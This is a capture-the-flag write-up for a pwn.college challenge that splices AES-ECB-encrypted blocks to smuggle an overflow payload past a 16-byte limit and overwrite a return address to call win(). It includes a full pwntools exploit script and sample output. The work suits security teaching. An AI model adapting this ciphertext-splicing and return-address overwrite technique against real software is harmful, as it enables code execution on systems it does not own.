# 🧠 Write-up: `ECB-to-win` – Integrated Security Challenge

**Category**: Cryptography + Binary Exploitation
**Platform**: pwn.college
**Challenge Type**: Combine AES-ECB abuse with stack buffer overflow
**Goal**: Execute the `win()` function to retrieve the flag

---

## 🧩 Challenge Overview

We're given:

1. A `dispatcher` script that encrypts up to 16 bytes of input using **AES-ECB**.
2. A binary `vulnerable-overflow` that decrypts the ciphertext using the same key and processes the decrypted message.

### AES Mode

* **Mode**: AES-ECB
* **Key**: 16 bytes (AES-128)
* **Padding**: PKCS7
* **Known behavior**: ECB encrypts each block independently → identical plaintext blocks → identical ciphertext blocks.

---

## 🔍 Binary Analysis Summary

We reverse-engineer `vulnerable-overflow.c` and observe:

### Input Message Format:

* The first AES block must be:

  ```
  "VERIFIED" + <8-byte length> + <message>
  ```

### Logic Flow:

1. Decrypt first block
2. Check `"VERIFIED"` header and extract length
3. Decrypt the rest of the ciphertext as the message
4. Store message in a stack buffer
5. After decryption, the program prints the message, dumps stack layout, and ends

### Key Exploitable Info:

* Stack buffer is **not protected** (no canary)
* **NX is enabled**, but the binary is **non-PIE**
* Function `win()` is available and will print the flag if executed
* Message length is limited to 16 bytes in the `dispatcher`, but **the binary decrypts many blocks if given a longer ciphertext**

---

## 🎯 Vulnerability Summary

**ECB’s block-based encryption** allows us to:

* Encrypt short payloads (16 bytes at a time)
* Reassemble a longer ciphertext from independently encrypted blocks

**The buffer overflow** allows us to:

* Overflow a fixed-size stack buffer and overwrite the return address
* Jump to `win()` by crafting the right payload

---

## 🧠 Exploit Strategy

### Step 1: Construct an overflow payload

We want to overwrite the saved return address with the address of `win()`:

```python
payload = b"A" * OFFSET + p64(WIN_ADDR)
```

We empirically found that:

* With padding added by AES during encryption, **a payload of 56 bytes** aligns the return address perfectly.

### Step 2: Encrypt each 16-byte chunk separately

Since dispatcher only accepts up to 16 bytes, we:

* Split the payload into 16-byte blocks
* Encrypt each block independently using `dispatcher`
* Build one long ciphertext from the encrypted blocks

### Step 3: Bypass the length field

We don't need to change the message length because the binary uses it **only to verify it's ≤ 16** — but **doesn't enforce it** beyond that. This lets us pass a longer ciphertext and overflow the buffer.

---

## 💻 Final Exploit Script

```python
from pwn import *
import subprocess
import struct

# Address of win() in the binary (non-PIE)
win_addr = 0x4018f7

# Number of bytes to reach saved RIP (accounting for padding impact)
offset = 56
payload = b"A" * offset + p64(win_addr)

# Split payload into 16-byte blocks
blocks = [payload[i:i+16] for i in range(0, len(payload), 16)]

ciphertext = b""
for i, block in enumerate(blocks):
    in_file = f"block_{i}.in"
    out_file = f"block_{i}.out"

    with open(in_file, "wb") as f:
        f.write(block)

    # Encrypt block using dispatcher
    subprocess.run(f"/challenge/dispatch < {in_file} > {out_file}", shell=True)

    with open(out_file, "rb") as f:
        encrypted = f.read()
        if i == 0:
            ciphertext += encrypted  # includes header + length + message part
        else:
            ciphertext += encrypted[16:]  # remove header, keep encrypted block only

# Send the final assembled ciphertext
p = process("/challenge/vulnerable-overflow")
p.send(ciphertext)
p.interactive()
```

---

## 🏁 Output (Successful Exploitation)

```
Your message header: VERIFIED
Your message length: 16
Decrypted message: AAAAAAAAAAAAAAAA...
You win! Here is your flag:
pwn.college{...}
```

---

## 🧠 Lessons Learned

1. **ECB is dangerous** — block independence allows plaintext structure recovery and ciphertext splicing.
2. **PKCS#7 padding matters** — it can be used to align payloads when carefully controlled.
3. **Even without decrypting**, we can build a valid ciphertext using knowledge of the structure and block behavior.
4. **Integrated attacks are real** — cryptographic and memory-level vulnerabilities can **combine** in powerful ways.

---

## ✅ Summary

| Aspect            | Description                                   |
| ----------------- | --------------------------------------------- |
| Vulnerability     | Stack-based buffer overflow                   |
| Crypto Weakness   | AES-ECB block independence                    |
| Goal              | Jump to `win()` by overwriting return address |
| Block Size        | 16 bytes (AES-128)                            |
| Overflow Offset   | 56 bytes                                      |
| Exploit Technique | Encrypted block injection via dispatcher      |

